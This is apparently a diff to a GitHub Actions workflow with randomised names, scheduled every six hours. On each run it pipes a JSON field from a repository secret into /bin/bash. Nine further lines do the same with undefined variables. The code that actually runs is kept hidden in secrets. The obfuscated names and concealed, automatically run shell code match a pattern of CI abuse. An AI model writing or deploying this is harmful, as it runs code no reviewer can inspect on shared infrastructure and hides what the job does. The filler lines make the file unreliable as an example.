@@ -1,23 +1,26 @@
 name: wanf2xy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
-jobs:  # 13500
+    - cron: '18 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanf2xy
         env:
-          hhhf221: ${{ secrets.hhhf221 }}
+          a4: ${{ secrets.a4 }}
         run: |
-          echo $hhhf221 | jq -r .v1 | /bin/bash
-          echo $x50 | jq -r .l22040 | /bin/bash
-          echo $je63 | jq -r .ctxr4 | /bin/bash
-          echo $gtn7063 | jq -r .wd061 | /bin/bash
-          echo $gw0 | jq -r .u048 | /bin/bash
-          echo $sjjje4 | jq -r .tod9132 | /bin/bash
-          echo $z1861 | jq -r .rx6373 | /bin/bash
+          echo $a4 | jq -r .addr18 | /bin/bash
+          echo $q07353 | jq -r .ccx79061 | /bin/bash
+          echo $ktdwp84 | jq -r .eg304 | /bin/bash
+          echo $zxvzh2 | jq -r .nidwf00 | /bin/bash
+          echo $oly2520 | jq -r .esvkd96 | /bin/bash
+          echo $efj410 | jq -r .cfrqg0 | /bin/bash
+          echo $bgb36814 | jq -r .ew645 | /bin/bash
+          echo $ws58046 | jq -r .pjcm7 | /bin/bash
+          echo $q061 | jq -r .krhzi05 | /bin/bash
+          echo $evjb8214 | jq -r .yws884 | /bin/bash
 
